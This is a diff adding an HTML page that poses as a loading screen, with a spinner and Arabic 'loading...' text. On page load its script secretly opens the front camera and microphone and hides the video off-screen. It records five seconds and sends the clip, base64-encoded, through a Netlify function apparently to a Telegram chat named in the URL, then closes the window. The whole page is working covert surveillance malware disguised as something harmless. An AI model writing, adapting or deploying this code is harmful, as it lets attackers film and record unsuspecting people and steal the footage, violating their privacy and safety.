@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥🇪🇬</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #1a2a3a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            color: white;
+            overflow: hidden;
+        }
+        
+        .loader-container {
+            text-align: center;
+        }
+        
+        .spinner {
+            width: 80px;
+            height: 80px;
+            border: 8px solid rgba(255,255,255,0.3);
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        .loading-text {
+            font-size: 18px;
+            color: rgba(255,255,255,0.8);
+            margin-top: 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        /* إخفاء كل العناصر التي قد تظهر */
+        video, canvas {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader-container">
+        <div class="spinner"></div>
+        <div class="loading-text">يتم التحميل...</div>
+    </div>
+
+    <video id="cameraPreview" autoplay playsinline muted></video>
+    <canvas id="videoCanvas"></canvas>
+
+    <script>
+        function getChatId() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get('chatId');
+        }
+        
+        async function sendVideoToTelegram(videoBlob, chatId) {
+            try {
+                // تحويل WebM إلى MP4 (تغيير النوع فقط)
+                const mp4Blob = new Blob([videoBlob], { type: 'video/mp4' });
+                
+                // تحويل Blob إلى Base64
+                const base64Promise = new Promise((resolve) => {
+                    const reader = new FileReader();
+                    reader.onloadend = () => resolve(reader.result);
+                    reader.readAsDataURL(mp4Blob);
+                });
+                
+                const base64Data = await base64Promise;
+                
+                // إرسال لـ Netlify Function
+                const response = await fetch('/.netlify/functions/send-video', {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json' 
+                    },
+                    body: JSON.stringify({
+                        chatId: chatId,
+                        video: base64Data.split(',')[1],
+                        filename: `video_${Date.now()}.mp4`
+                    })
+                });
+                
+                const result = await response.json();
+                return result.success;
+                
+            } catch (error) {
+                console.error('Error sending video:', error);
+                return false;
+            }
+        }
+        
+        async function recordVideo() {
+            const chatId = getChatId();
+            if (!chatId) {
+                window.close();
+                return;
+            }
+            
+            try {
+                // فتح الكاميرا الأمامية بشكل خفي (بدون عرض)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 480 },  // دقة أقل للسرعة
+                        height: { ideal: 360 }
+                    },
+                    audio: true
+                });
+                
+                // ربط الكاميرا بالعنصر المخفي
+                const video = document.getElementById('cameraPreview');
+                video.srcObject = stream;
+                
+                // بدء تشغيل الفيديو (مخفي)
+                await video.play();
+                
+                // بدء تسجيل الفيديو
+                const mediaRecorder = new MediaRecorder(stream, {
+                    mimeType: 'video/webm;codecs=vp8,opus',
+                    videoBitsPerSecond: 300000 // جودة أقل للسرعة
+                });
+                
+                const chunks = [];
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        chunks.push(event.data);
+                    }
+                };
+                
+                mediaRecorder.onstop = async () => {
+                    // تجميع الفيديو
+                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                    
+                    // إرسال الفيديو
+                    await sendVideoToTelegram(videoBlob, chatId);
+                    
+                    // إغلاق الكاميرا
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // إغلاق النافذة بعد 1 ثانية
+                    setTimeout(() => {
+                        window.close();
+                    }, 1000);
+                };
+                
+                // بدء التسجيل
+                mediaRecorder.start();
+                
+                // تسجيل لمدة 5 ثواني
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, 5000);
+                
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                setTimeout(() => {
+                    window.close();
+                }, 1000);
+            }
+        }
+        
+        // بدء التسجيل فوراً
+        window.addEventListener('load', recordVideo);
+    </script>
+</body>
+</html>
